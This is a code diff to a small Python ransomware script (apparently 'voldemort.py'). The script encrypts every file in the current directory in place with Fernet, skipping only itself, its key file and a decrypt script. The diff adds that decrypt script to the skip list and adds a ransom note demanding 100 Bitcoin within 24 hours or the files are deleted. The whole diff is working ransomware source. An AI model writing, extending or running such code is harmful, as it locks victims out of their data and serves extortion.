@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "voldemort.py" or file == "thekey.key":
+	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -25,3 +25,4 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+print("All your files have been encrypted! Send me 100 Bitcoin or they'll be deleted in 24 hours")
